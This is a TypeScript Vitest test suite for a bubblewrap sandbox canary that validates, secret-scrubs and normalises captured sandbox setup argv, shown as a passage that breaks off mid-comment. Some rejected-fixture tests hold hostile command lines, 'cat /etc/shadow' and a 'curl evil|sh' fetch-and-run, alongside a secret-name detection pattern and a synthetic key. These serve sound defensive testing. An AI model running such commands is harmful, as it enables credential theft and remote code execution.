import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// PR2 (#5875 item 1) — faithful sandbox canary, REPLAY-side logic (deploy-time).
// Per ADR-079 the deploy-time canary is creds-free/network-free/deterministic:
// it replays the SDK-captured bwrap SETUP argv inside the running canary
// container and classifies the exit. These are the pure, LLM-free assertions
// (the plan's "no LLM in the assertion path" requirement) — the model-turn
// CAPTURE path is exercised only by PR3's CI gate.
import {
  argvSecretRejection,
  assessCaptureOutcome,
  buildBwrapInvocation,
  BWRAP_BIND_SRC_OPTS,
  BWRAP_ONE_ARG_PATH,
  CANARY_BRIDGE_SPAWN_PLACEHOLDER,
  CANARY_C4_STAGING_PLACEHOLDER,
  CANARY_EMPTY_PLACEHOLDER,
  CANARY_WS_PLACEHOLDER,
  classifyOuterWrapReplayVerdict,
  hasUnsubstitutedPlaceholder,
  isDeterministicConstPath,
  classifyFdCensusProbe,
  classifyForkProbe,
  classifyReplayVerdict,
  classifyUsernsDenyProbe,
  computeCanaryPaths,
  countFdValuedOptions,
  normalizeCapturedArgv,
  outerWrapChdirTarget,
  parseShimSetupArgv,
  selectSandboxSetupArgv,
  substituteCanonicalArgv,
  substituteOuterRoot,
  validateFixture,
  validateOuterWrapFixture,
} from "../scripts/sandbox-canary.mjs";

const MJS_PATH = fileURLToPath(
  new URL("../scripts/sandbox-canary.mjs", import.meta.url),
);

describe("classifyReplayVerdict — exit-code classification (false-rollback prevention)", () => {
  it("bwrap exit 0 ⇒ pass", () => {
    expect(classifyReplayVerdict({ bwrapExitCode: 0, bwrapStderr: "" })).toEqual({
      verdict: "pass",
      reason: "ok",
    });
  });

  it('bwrap stderr "Operation not permitted" ⇒ sandbox_broken (the #5873 shape)', () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: 1,
      bwrapStderr:
        "bwrap: setting up uid map: Operation not permitted",
    });
    expect(v.verdict).toBe("sandbox_broken");
  });

  it("bwrap spawn ENOENT ⇒ canary_infra_error (do NOT roll back)", () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: null,
      bwrapStderr: "",
      spawnErrorCode: "ENOENT",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });

  it("bwrap-shim: marker (exit 65) ⇒ sandbox_broken bwrap_shim_refused — our shim's refusal is deterministic breakage, not infra flake", () => {
    // Without this row a deleted branch degrades every shim refusal to
    // bwrap_exit_65 → canary_infra_error → a fleet-wide spawn outage pages
    // nobody.
    expect(
      classifyReplayVerdict({
        bwrapExitCode: 65,
        bwrapStderr: "bwrap-shim: seccomp artifact not readable: /app/infra/bwrap-userns-clone3-deny.bpf",
      }),
    ).toMatchObject({ verdict: "sandbox_broken", reason: "bwrap_shim_refused" });
  });

  it("ambiguous non-zero bwrap exit (no EPERM signature) ⇒ canary_infra_error, not sandbox_broken", () => {
    // Conservative: only a bwrap EPERM signature rolls back once blocking.
    // Any other non-zero (OOM, transient, unknown) must NOT be read as a
    // broken sandbox — that is the #4941 false-rollback class.
    const v = classifyReplayVerdict({
      bwrapExitCode: 137,
      bwrapStderr: "Killed",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });
});

describe("validateFixture — captured-argv fixture contract", () => {
  it('uncaptured sentinel ⇒ status "uncaptured" (dark-launch before PR3 capture)', () => {
    const f = validateFixture({ status: "uncaptured" });
    expect(f.status).toBe("uncaptured");
  });

  it("valid captured fixture returns setup argv + prepDirs", () => {
    const f = validateFixture({
      sdkVersion: "0.3.197",
      sdkPackage: "@anthropic-ai/claude-agent-sdk",
      workspacePath: "/workspaces/.sandbox-canary",
      prepDirs: ["/workspaces/.sandbox-canary"],
      bwrapSetupArgv: ["--new-session", "--unshare-user", "--unshare-pid"],
    });
    expect(f.status).toBe("captured");
    expect(f.bwrapSetupArgv).toEqual([
      "--new-session",
      "--unshare-user",
      "--unshare-pid",
    ]);
    expect(f.prepDirs).toEqual(["/workspaces/.sandbox-canary"]);
  });

  it("malformed fixture (bwrapSetupArgv not an array) throws", () => {
    expect(() =>
      validateFixture({ bwrapSetupArgv: "not-an-array" }),
    ).toThrow();
  });

  it("empty captured argv is rejected (empty-green guard)", () => {
    // An empty argv fixture would make bwrap succeed trivially — the
    // empty-fixture false-green class the CTO flagged (constraint #6).
    expect(() =>
      validateFixture({ bwrapSetupArgv: [], prepDirs: [] }),
    ).toThrow();
  });
});

describe("buildBwrapInvocation — replays SETUP argv + '-- true' only", () => {
  it("appends the '-- true' no-op command, never a captured command", () => {
    const { cmd, args } = buildBwrapInvocation({
      status: "captured",
      bwrapSetupArgv: ["--new-session", "--unshare-user"],
      prepDirs: ["/workspaces/.sandbox-canary"],
    });
    expect(cmd).toBe("bwrap");
    expect(args).toEqual(["--new-session", "--unshare-user", "--", "true"]);
  });

  it("rejects a fixture whose setup argv already contains a bare '--' separator (defensive)", () => {
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["--new-session", "--", "cat", "/etc/shadow"],
        prepDirs: [],
      }),
    ).toThrow();
  });

  it("rejects a fixture whose argv[0] is a bare command, not a bwrap option (sanity filter)", () => {
    // bwrap treats the first non-option token as the COMMAND — a real setup
    // argv always begins with an option. This is a cheap filter, not the
    // security boundary (that is the committed + baked + --verify fixture path).
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["/bin/sh", "-c", "curl evil|sh"],
        prepDirs: [],
      }),
    ).toThrow();
  });
});

// ---------------------------------------------------------------------------
// PR3 (#5913 / ADR-079 deferral B) — CAPTURE-side pure logic (LLM-free).
// The model turn only decides WHETHER the SDK builds+spawns bwrap; these pure
// functions decide what the fixture asserts, so the LLM stays out of the
// assertion path (learning 2026-04-19-llm-sdk-security-tests-need-deterministic).
// ---------------------------------------------------------------------------

describe("parseShimSetupArgv — split the shim argv at the first '--'", () => {
  it("returns the prefix before the first '--' (the bwrap SETUP argv)", () => {
    expect(
      parseShimSetupArgv([
        "--new-session",
        "--unshare-user",
        "--unshare-pid",
        "--",
        "true",
      ]),
    ).toEqual(["--new-session", "--unshare-user", "--unshare-pid"]);
  });

  it("splits at the FIRST '--' only (a later '--' stays in the command tail)", () => {
    expect(
      parseShimSetupArgv(["--new-session", "--", "sh", "-c", "echo --"]),
    ).toEqual(["--new-session"]);
  });

  it("returns the whole argv when there is no '--' separator", () => {
    expect(parseShimSetupArgv(["--new-session", "--unshare-user"])).toEqual([
      "--new-session",
      "--unshare-user",
    ]);
  });

  it("returns an empty array when '--' is first (no setup options)", () => {
    expect(parseShimSetupArgv(["--", "true"])).toEqual([]);
  });
});

describe("computeCanaryPaths — pure, IO-free, deterministic zero-sibling path set", () => {
  it("maps a fixed base to a stable {root, ownWorkspacePath, prepDirs} set", () => {
    const a = computeCanaryPaths("/fixed/base");
    const b = computeCanaryPaths("/fixed/base");
    // Byte-identical across calls (no mktemp randomness) — the property that
    // makes the captured argv byte-reproducible for --verify.
    expect(a).toEqual(b);
    expect(a.root).toBe("/fixed/base/soleur-sandbox-canary");
    expect(a.ownWorkspacePath.startsWith(a.root + "/")).toBe(true);
    // The own workspace is the ONLY entry under root (zero siblings) so the
    // captured restore set is deterministic — under the constant parent deny
    // (#5862) the covering `--tmpfs <root>` is a fixed literal either way.
    expect(a.prepDirs).toContain(a.ownWorkspacePath);
  });

  it("does not touch the filesystem (pure) — an absent base still returns paths", () => {
    // A path under a directory that does not exist must not throw (no realpath,
    // no mkdir in the pure tier).
    const p = computeCanaryPaths("/nonexistent-canary-base-xyz");
    expect(p.ownWorkspacePath).toContain("/nonexistent-canary-base-xyz/");
  });
});

describe("selectSandboxSetupArgv — pick the --unshare-user spawn among multiple", () => {
  it("selects the invocation carrying --unshare-user (the sandbox SETUP spawn)", () => {
    const invocations = [
      ["--version"], // an SDK probe spawn, no userns
      ["--new-session", "--unshare-user", "--unshare-pid"],
    ];
    expect(selectSandboxSetupArgv(invocations)).toEqual([
      "--new-session",
      "--unshare-user",
      "--unshare-pid",
    ]);
  });

  it("returns the single invocation when only one was recorded", () => {
    expect(
      selectSandboxSetupArgv([["--new-session", "--unshare-user"]]),
    ).toEqual(["--new-session", "--unshare-user"]);
  });

  it("returns null when no invocation carries --unshare-user", () => {
    expect(selectSandboxSetupArgv([["--version"], ["--help"]])).toBeNull();
  });

  it("returns null when no invocations were recorded", () => {
    expect(selectSandboxSetupArgv([])).toBeNull();
  });
});

describe("assessCaptureOutcome — LLM-free retry-loop decision", () => {
  it("captured=true for a valid non-empty --unshare-* argv", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--new-session", "--unshare-user", "--unshare-pid"],
    });
    expect(r.captured).toBe(true);
  });

  it("captured=false (no_tool_call) when the shim never recorded a bwrap spawn", () => {
    const r = assessCaptureOutcome({ captureFilePresent: false, setupArgv: null });
    expect(r.captured).toBe(false);
    expect(r.reason).toBe("capture_no_bwrap:no_tool_call");
  });

  it("captured=false when the argv is present but carries no --unshare-* token", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--new-session", "--die-with-parent"],
    });
    expect(r.captured).toBe(false);
    expect(r.reason).toContain("capture_no_bwrap");
  });

  it("captured=false for an empty argv (reuses validateFixture's empty-green guard)", () => {
    const r = assessCaptureOutcome({ captureFilePresent: true, setupArgv: [] });
    expect(r.captured).toBe(false);
  });

  it("captured=false when a token is not a string", () => {
    const r = assessCaptureOutcome({
      captureFilePresent: true,
      setupArgv: ["--unshare-user", 42],
    });
    expect(r.captured).toBe(false);
  });
});

describe("argvSecretRejection — secret-scrub before writing the image-baked fixture", () => {
  // Split across concatenation so no contiguous `sk-ant-oat01-…`-shaped literal
  // exists in source (avoids tripping gitleaks / GitHub push protection —
  // cq-test-fixtures-synthesized-only + the split-fixture learning). The runtime
  // value keeps the redactor-matching shape.
  const KEY = "sk-ant-" + "oat01-" + "NOTAREALKEY000000000000";

  it("returns null (accept) for a clean setup argv", () => {
    expect(
      argvSecretRejection(
        ["--new-session", "--unshare-user", "--setenv", "PATH", "/usr/bin"],
        KEY,
      ),
    ).toBeNull();
  });

  it("rejects when a token contains the literal API key value", () => {
    expect(
      argvSecretRejection(
        ["--new-session", `--setenv`, "FOO", `prefix-${KEY}-suffix`],
        KEY,
      ),
    ).not.toBeNull();
  });

  it("rejects a --setenv whose NAME matches /KEY|TOKEN|SECRET|PASSWORD/i", () => {
    expect(
      argvSecretRejection(
        ["--unshare-user", "--setenv", "ANTHROPIC_API_KEY", "whatever"],
        KEY,
      ),
    ).not.toBeNull();
    expect(
      argvSecretRejection(
        ["--unshare-user", "--setenv", "github_token", "x"],
        KEY,
      ),
    ).not.toBeNull();
  });

  it("does not reject a benign --setenv NAME (PATH, HOME, LANG)", () => {
    expect(
      argvSecretRejection(
        ["--setenv", "PATH", "/usr/bin", "--setenv", "HOME", "/root"],
        KEY,
      ),
    ).toBeNull();
  });

  it("tolerates an empty/undefined key value (no literal match), still checks NAME", () => {
    expect(argvSecretRejection(["--setenv", "PATH", "/usr/bin"], "")).toBeNull();
    expect(
      argvSecretRejection(["--setenv", "MY_SECRET", "x"], ""),
    ).not.toBeNull();
  });

  it("checkSetenvNames:false skips the NAME rule (raw-argv pass), still catches literal VALUE", () => {
    // The SDK always forwards a benign secret-shaped env var (CLOUDSDK_PROXY_PASSWORD)
    // that projection DROPS — rejecting on it in the RAW argv would block every
    // capture. The raw pass checks only the literal secret value.
    expect(
      argvSecretRejection(
        ["--setenv", "CLOUDSDK_PROXY_PASSWORD", ""],
        KEY,
        { checkSetenvNames: false },
      ),
    ).toBeNull();
    expect(
      argvSecretRejection(
        ["--setenv", "FOO", KEY],
        KEY,
        { checkSetenvNames: false },
      ),
    ).not.toBeNull();
  });
});

describe("normalizeCapturedArgv — canonical projection (ADR-079 amend / CTO Option A)", () => {
  const WS = "/tmp/soleur-sandbox-canary/00000000-0000-4000-8000-0000000000ca";
  // A faithful slice of the real 0.3.197 SDK argv (empirically captured #5913).
  const RAW = [
    "--new-session",
    "--die-with-parent",
    "--unshare-net",
    "--bind",
    "/tmp/claude-http-4d00bdd60f15d924.sock",
    "/tmp/claude-http-4d00bdd60f15d924.sock",
    "--setenv",
    "CLOUDSDK_PROXY_PASSWORD",
    "secretval",
    "--setenv",
    "PATH",
    "/usr/bin",
    "--ro-bind",
    "/",
    "/",
    "--bind",
    "/home/jean/.npm/_logs",
    "/home/jean/.npm/_logs",
    "--bind",
    WS,
    WS,
    "--tmpfs",
    "/proc",
    "--ro-bind",
    "/tmp/claude-empty-Lrt1F7",
    `${WS}/.claude`,
    "--ro-bind",
    "/dev/null",
    `${WS}/.gitconfig`,
    "--dev",
    "/dev",
    "--unshare-pid",
    "--unshare-user",
    "--bind",
    "/proc",
    "/proc",
  ];

  it("drops all --setenv (env-forwarding, secret-shaped names) and counts them", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv).not.toContain("--setenv");
    expect(bwrapSetupArgv).not.toContain("CLOUDSDK_PROXY_PASSWORD");
    expect(dropped.setenv).toBe(2);
  });

  it("drops the random proxy socket bind and the host-specific bind", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv.join(" ")).not.toContain("claude-http-");
    expect(bwrapSetupArgv.join(" ")).not.toContain("/home/jean/.npm");
    expect(dropped.randomSocket).toBe(1);
    expect(dropped.hostBind).toBe(1);
  });

  it("normalizes the ws root to ${CANARY_WS} and the random-empty src to ${CANARY_EMPTY}", () => {
    const { bwrapSetupArgv, dropped } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    // own-workspace bind normalized
    expect(bwrapSetupArgv).toContain(CANARY_WS_PLACEHOLDER);
    expect(bwrapSetupArgv.join(" ")).toContain(`${CANARY_WS_PLACEHOLDER}/.claude`);
    // random empty src normalized to the placeholder, deterministic dst kept
    expect(bwrapSetupArgv).toContain(CANARY_EMPTY_PLACEHOLDER);
    expect(bwrapSetupArgv.join(" ")).not.toContain("claude-empty-");
    expect(dropped.randomEmptyDirBind).toBe(1);
  });

  it("keeps the full --unshare-* multiset (the #5849 split-unshare discriminator)", () => {
    const { bwrapSetupArgv } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(bwrapSetupArgv).toContain("--unshare-user");
    expect(bwrapSetupArgv).toContain("--unshare-pid");
    expect(bwrapSetupArgv).toContain("--unshare-net");
  });

  it("keeps deterministic-const binds (/, /dev/null, /proc) and structural flags", () => {
    const { bwrapSetupArgv } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const s = bwrapSetupArgv.join(" ");
    expect(s).toContain("--ro-bind / /");
    expect(s).toContain(`--ro-bind /dev/null ${CANARY_WS_PLACEHOLDER}/.gitconfig`);
    expect(s).toContain("--bind /proc /proc");
    expect(s).toContain("--tmpfs /proc");
    expect(s).toContain("--dev /dev");
    expect(bwrapSetupArgv[0]).toBe("--new-session");
  });

  it("is byte-deterministic: two projections of the same raw argv are identical", () => {
    const a = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const b = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(a.bwrapSetupArgv).toEqual(b.bwrapSetupArgv);
    expect(a.prepDirs).toEqual(b.prepDirs);
  });

  it("prepDirs are placeholder dirs to mkdir at replay (ws root + empty dir)", () => {
    const { prepDirs } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    expect(prepDirs).toContain(CANARY_WS_PLACEHOLDER);
    expect(prepDirs).toContain(CANARY_EMPTY_PLACEHOLDER);
  });

  it("throws on an unrecognized bwrap option (SDK argv shape changed → fail loud)", () => {
    expect(() =>
      normalizeCapturedArgv(["--new-session", "--frobnicate", "x"], { wsRoot: WS }),
    ).toThrow(/unrecognized/i);
  });

  it("produces an argv buildBwrapInvocation accepts after substitution", () => {
    const { bwrapSetupArgv, prepDirs } = normalizeCapturedArgv(RAW, { wsRoot: WS });
    const sub = substituteCanonicalArgv(bwrapSetupArgv, {
      ws: "/replay/ws",
      empty: "/replay/empty",
    });
    // no placeholder survives substitution
    expect(sub.join(" ")).not.toContain("${CANARY");
    const { cmd, args } = buildBwrapInvocation({
      status: "captured",
      bwrapSetupArgv: sub,
      prepDirs,
    });
    expect(cmd).toBe("bwrap");
    expect(args[args.length - 1]).toBe("true");
  });
});

describe("substituteCanonicalArgv — replay-time placeholder substitution", () => {
  it("replaces ${CANARY_WS} and ${CANARY_EMPTY} in every token", () => {
    const out = substituteCanonicalArgv(
      ["--bind", CANARY_WS_PLACEHOLDER, `${CANARY_WS_PLACEHOLDER}/.claude`, "--ro-bind", CANARY_EMPTY_PLACEHOLDER, `${CANARY_WS_PLACEHOLDER}/x`],
      { ws: "/w", empty: "/e" },
    );
    expect(out).toEqual(["--bind", "/w", "/w/.claude", "--ro-bind", "/e", "/w/x"]);
  });
});

describe("source contract — imports the SDK config, does not re-specify options", () => {
  const src = readFileSync(MJS_PATH, "utf8");

  it("references buildAgentSandboxConfig from agent-runner-sandbox-config (capture faithfulness)", () => {
    expect(src).toMatch(/agent-runner-sandbox-config/);
    expect(src).toMatch(/buildAgentSandboxConfig/);
  });

  it("imports the SDK config LAZILY (dynamic import) so the replay path stays pure", () => {
    // A top-level static import would drag the config's heavy static graph
    // (logger, etc.) into the creds-free replay path. The config import must
    // live inside the capture function via `await import(...)`.
    expect(src).toMatch(/await import\(/);
    expect(src).not.toMatch(
      /^import\s+\{[^}]*buildAgentSandboxConfig[^}]*\}\s+from/m,
    );
  });

  it("does not hand-author a bwrap argv literal (the #4932 trap)", () => {
    // The setup argv must come from the captured fixture, never a literal in
    // the script. Guard against a re-introduced hand-rolled `--unshare-*` list.
    expect(src).not.toMatch(/const\s+\w*[Aa]rgv\w*\s*=\s*\[\s*["']--unshare/);
  });
});

// #8623 — the C4 re-render staging root is a server-private denyRead entry;
// ADR-079 amendment "server-private deny roots are placeholdered".
describe("C4 staging root placeholder (#8623)", () => {
  const WS = "/tmp/soleur-sandbox-canary/00000000-0000-4000-8000-0000000000ca";
  const C4 = "/tmp/soleur-canary-c4-AbC123";
  const RAW = ["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", "/proc", "--tmpfs", C4];

  it("maps the staging root (and subpaths) to ${CANARY_C4_STAGING} and adds it to prepDirs", () => {
    const { bwrapSetupArgv, prepDirs } = normalizeCapturedArgv([...RAW, "--tmpfs", `${C4}/sub`], {
      wsRoot: WS,
      c4StagingRoot: C4,
    });
    expect(bwrapSetupArgv).toContain(CANARY_C4_STAGING_PLACEHOLDER);
    expect(bwrapSetupArgv).toContain(`${CANARY_C4_STAGING_PLACEHOLDER}/sub`);
    expect(bwrapSetupArgv.some((t: string) => t.includes(C4))).toBe(false);
    expect(prepDirs).toContain(CANARY_C4_STAGING_PLACEHOLDER);
  });

  it("refuses to project a literal capture-host HOME path into the fixture", () => {
    for (const bad of ["/root/.cache/soleur-c4-render", "/home/soleur/.cache/soleur-c4-render"]) {
      expect(() =>
        normalizeCapturedArgv(["--ro-bind", "/", "/", "--tmpfs", bad], { wsRoot: WS }),
      ).toThrow(/host_path/);
    }
  });

  it("substitutes all three placeholders, and flags any that survive", () => {
    const argv = [CANARY_WS_PLACEHOLDER, CANARY_EMPTY_PLACEHOLDER, `${CANARY_C4_STAGING_PLACEHOLDER}/x`];
    const out = substituteCanonicalArgv(argv, { ws: "/w", empty: "/e", c4Staging: "/c" });
    expect(out).toEqual(["/w", "/e", "/c/x"]);
    expect(hasUnsubstitutedPlaceholder(out)).toBe(false);
    expect(hasUnsubstitutedPlaceholder(substituteCanonicalArgv(argv, { ws: "/w", empty: "/e" }))).toBe(true);
    expect(hasUnsubstitutedPlaceholder(["${CANARY_FUTURE}"])).toBe(true);
  });

  it("the COMMITTED fixture carries the staging-root deny exactly once, placeholdered, with no host paths", () => {
    const fx = JSON.parse(
      readFileSync(fileURLToPath(new URL("../infra/sandbox-canary-argv.json", import.meta.url)), "utf8"),
    ) as { bwrapSetupArgv: string[]; prepDirs: string[] };
    const argv = fx.bwrapSetupArgv;
    expect(argv.some((t) => /^\/(root|home)(\/|$)/.test(t))).toBe(false);
    const tmpfsC4 = argv.filter((t, i) => t === CANARY_C4_STAGING_PLACEHOLDER && argv[i - 1] === "--tmpfs");
    expect(tmpfsC4).toHaveLength(1);
    const known = [CANARY_WS_PLACEHOLDER, CANARY_EMPTY_PLACEHOLDER, CANARY_C4_STAGING_PLACEHOLDER, CANARY_BRIDGE_SPAWN_PLACEHOLDER];
    for (const t of [...argv, ...fx.prepDirs]) {
      for (const m of t.match(/\$\{CANARY_[A-Z0-9_]*\}/g) ?? []) expect(known).toContain(m);
    }
    expect(fx.prepDirs).toContain(CANARY_C4_STAGING_PLACEHOLDER);
  });
});

// #9614/#9618 — the SDK-internal bridge-spawn dir is HOME-derived
// (`join(homedir(), ".claude", "bridge-spawn")` in the bundled CLI, no env
// override); ADR-079 2026-10-06 amendment: SDK-internal HOME-derived dirs are
// placeholdered via a capture-computed root.
describe("bridge-spawn placeholder (#9614/#9618)", () => {
  const WS = "/tmp/soleur-sandbox-canary/00000000-0000-4000-8000-0000000000ca";
  const BSP = "/root/.claude/bridge-spawn";
  const RAW = ["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", "/proc", "--tmpfs", BSP];

  it("maps the bridge-spawn root (and subpaths) to ${CANARY_BRIDGE_SPAWN} and adds it to prepDirs", () => {
    const { bwrapSetupArgv, prepDirs } = normalizeCapturedArgv([...RAW, "--tmpfs", `${BSP}/sub`], {
      wsRoot: WS,
      bridgeSpawnRoot: BSP,
    });
    expect(bwrapSetupArgv).toContain(CANARY_BRIDGE_SPAWN_PLACEHOLDER);
    expect(bwrapSetupArgv).toContain(`${CANARY_BRIDGE_SPAWN_PLACEHOLDER}/sub`);
    expect(bwrapSetupArgv.some((t: string) => t.includes(BSP))).toBe(false);
    expect(prepDirs).toContain(CANARY_BRIDGE_SPAWN_PLACEHOLDER);
  });

  it("does NOT add the placeholder to prepDirs when the argv never references it", () => {
    const { prepDirs } = normalizeCapturedArgv(
      ["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", "/proc"],
      { wsRoot: WS, bridgeSpawnRoot: BSP },
    );
    expect(prepDirs).not.toContain(CANARY_BRIDGE_SPAWN_PLACEHOLDER);
  });

  it("still throws host_path on the bridge-spawn token when bridgeSpawnRoot is NOT supplied (fail-loud)", () => {
    expect(() => normalizeCapturedArgv(RAW, { wsRoot: WS })).toThrow(/host_path/);
  });

  it("still throws host_path on other HOME paths when bridgeSpawnRoot IS supplied", () => {
    for (const bad of ["/root/.ssh", `${BSP}-evil`, `${BSP}x`]) {
      expect(
        () =>
          normalizeCapturedArgv(["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", bad], {
            wsRoot: WS,
            bridgeSpawnRoot: BSP,
          }),
        `expected host_path throw for '${bad}'`,
      ).toThrow(/host_path/);
    }
  });

  it("rejects `..` segments inside mapped subpaths (traversal would reach mkdir outside the roots)", () => {
    expect(() =>
      normalizeCapturedArgv(["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", `${WS}/../escape`], {
        wsRoot: WS,
      }),
    ).toThrow(/traversal/);
    expect(() =>
      normalizeCapturedArgv(["--ro-bind", "/", "/", "--bind", WS, WS, "--tmpfs", `${BSP}/../escape`], {
        wsRoot: WS,
        bridgeSpawnRoot: BSP,
      }),
    ).toThrow(/traversal/);
  });

  it("preps placeholder-subpath bind sources and literal tmpfs targets (replay precondition)", () => {
    const { prepDirs } = normalizeCapturedArgv(
      [
        "--ro-bind", "/", "/",
        "--bind", WS, WS,
        "--ro-bind", `${WS}/.claude`, `${WS}/.claude`,
        "--ro-bind", "/dev/null", `${WS}/.claude/settings.json`,
        "--tmpfs", "/tmp/claude-0/bash-edit-diff",
        "--tmpfs", "/proc",
      ],
      { wsRoot: WS, bridgeSpawnRoot: BSP },
    );
    expect(prepDirs).toContain(`${CANARY_WS_PLACEHOLDER}/.claude`);
    expect(prepDirs).toContain("/tmp/claude-0/bash-edit-diff");
    // File-mount dsts are auto-created by bwrap — never pre-created as dirs.
    expect(prepDirs).not.toContain(`${CANARY_WS_PLACEHOLDER}/.claude/settings.json`);
    // Image-guaranteed consts are exempt.
    expect(prepDirs).not.toContain("/proc");
  });

  it("preps placeholder-subpath MOUNT targets exactly (mount order makes prefix coverage unsound)", () => {
    const { prepDirs } = normalizeCapturedArgv(
      ["--ro-bind", "/", "/", "--tmpfs", `${WS}/probe`, "--bind", WS, WS],
      { wsRoot: WS },
    );
    expect(prepDirs).toContain(`${CANARY_WS_PLACEHOLDER}/probe`);
  });

  it("does NOT prep symlink targets or file/file-data sources (not real source dirs)", () => {
    const { prepDirs } = normalizeCapturedArgv(
      ["--ro-bind", "/", "/", "--bind", WS, WS, "--symlink", `${WS}/tgt`, `${WS}/lnk`],
      { wsRoot: WS },
    );
    expect(prepDirs).not.toContain(`${CANARY_WS_PLACEHOLDER}/tgt`);
    expect(prepDirs).not.toContain(`${CANARY_WS_PLACEHOLDER}/lnk`);
  });

  it("substitutes ${CANARY_BRIDGE_SPAWN} at replay, and flags it when unsubstituted", () => {
    const argv = [CANARY_WS_PLACEHOLDER, `${CANARY_BRIDGE_SPAWN_PLACEHOLDER}/x`];
    const out = substituteCanonicalArgv(argv, { ws: "/w", empty: "/e", bridgeSpawn: "/b" });
    expect(out).toEqual(["/w", "/b/x"]);
    expect(hasUnsubstitutedPlaceholder(out)).toBe(false);
    expect(
      hasUnsubstitutedPlaceholder(substituteCanonicalArgv(argv, { ws: "/w", empty: "/e" })),
    ).toBe(true);
  });

  it("the COMMITTED fixture carries the bridge-spawn tmpfs exactly once, placeholdered", () => {
    const fx = JSON.parse(
      readFileSync(fileURLToPath(new URL("../infra/sandbox-canary-argv.json", import.meta.url)), "utf8"),
    ) as { bwrapSetupArgv: string[]; prepDirs: string[] };
    const argv = fx.bwrapSetupArgv;
    const tmpfsBsp = argv.filter((t, i) => t === CANARY_BRIDGE_SPAWN_PLACEHOLDER && argv[i - 1] === "--tmpfs");
    expect(tmpfsBsp).toHaveLength(1);
    expect(fx.prepDirs).toContain(CANARY_BRIDGE_SPAWN_PLACEHOLDER);
  });

  // The hole that let a non-replayable fixture ship: every dir the real bwrap
  // spawn needs must resolve EXACTLY in prepDirs — a placeholder-root prefix
  // is not sufficient for subpath targets, because bwrap applies mounts in
  // argv order and a target under a not-yet-bound parent fails like a missing
  // source. Pinned structurally so a future SDK argv shape cannot
  // reintroduce it silently. Opt vocab + const predicate are imported from
  // the implementation — a parser addition updates this test automatically.
  it("the COMMITTED fixture preps every bind-source subpath and mount target", () => {
    const fx = JSON.parse(
      readFileSync(fileURLToPath(new URL("../infra/sandbox-canary-argv.json", import.meta.url)), "utf8"),
    ) as { bwrapSetupArgv: string[]; prepDirs: string[] };
    const argv = fx.bwrapSetupArgv;
    const prepped = new Set(fx.prepDirs);
    for (let i = 0; i < argv.length; i++) {
      const t = argv[i];
      const next = argv[i + 1];
      if (BWRAP_ONE_ARG_PATH.has(t) && typeof next === "string" && !isDeterministicConstPath(next)) {
        expect(prepped.has(next), `mount target ${t} ${next} not in prepDirs`).toBe(true);
      }
      // Any bind option whose SOURCE is a placeholder subpath must be prepped
      // (bwrap never creates sources).
      if (
        BWRAP_BIND_SRC_OPTS.has(t) &&
        typeof next === "string" &&
        /\$\{CANARY_[A-Z0-9_]*\}\//.test(next)
      ) {
        expect(prepped.has(next), `bind source ${next} not in prepDirs`).toBe(true);
      }
    }
  });
});

// ---------------------------------------------------------------------------
// #5862 — deny-before-restore ordering pin on the COMMITTED fixture (the
// ADR-075 exit criterion). The tenant isolation property is positional: the
// covering `--tmpfs` on the workspaces root must land BEFORE the vendored
// builder's rw `--bind` restore of the own workspace. A future SDK drift that
// re-inverts the ordering (deny last, or deny with no restore) strands or
// exposes the workspace — this pin turns both into a red suite pre-merge.
// ---------------------------------------------------------------------------

const CANARY_ROOT_REAL = computeCanaryPaths().root; // "/tmp/soleur-sandbox-canary"
const WS_REAL = computeCanaryPaths().ownWorkspacePath;

/** Substitute the fixture's placeholders with the canonical capture paths so
 * covering-class membership is decidable on real paths. */
function substituteFixtureArgv(argv: string[]): string[] {
  return substituteCanonicalArgv(argv, {
    ws: WS_REAL,
    empty: "/replay/empty",
    c4Staging: "/replay/c4-staging",
    bridgeSpawn: "/replay/bridge-spawn",
  });
}

// Mount ops whose DESTINATION can cover/shadow wsDst. Deliberately wider than
// `--tmpfs`: a post-restore `--bind`/`--ro-bind`/`--dev-bind*`/`--overlay*` on
// an ancestor re-exposes or re-read-only-mounts the whole tree — the pin must
// see them, not just the deny it was written for.
const MOUNT_DST_OPTS = new Set([
  "--tmpfs",
  "--remount-ro", // 1-arg: dst is argv[i+1]
]);
const MOUNT_DST2_OPTS = new Set([
  // 2-arg bind family: dst is argv[i+2]
  "--bind",
  "--bind-try",
  "--dev-bind",
  "--dev-bind-try",
  "--ro-bind",
  "--ro-bind-try",
  "--overlay",
  "--tmp-overlay",
  "--ro-overlay",
  "--bind-data",
  "--ro-bind-data",
]);

/** Path `t` covers `wsDst` when it equals it or is a strict ancestor.
 * Trailing slashes normalized; "/" covers everything. */
const pathCovers = (t: unknown, wsDst: string): t is string =>
  typeof t === "string" &&
  (t === "/" || wsDst === t || wsDst.startsWith(`${t.replace(/\/+$/, "")}/`));

/** Strict ancestor only — a tmpfs AT wsDst masks the workspace but no
 * siblings, so it does not satisfy the tenant-isolation clause. */
const pathStrictlyCovers = (t: unknown, wsDst: string): t is string =>
  typeof t === "string" &&
  t !== wsDst &&
  (t === "/" || wsDst.startsWith(`${t.replace(/\/+$/, "")}/`));

/**
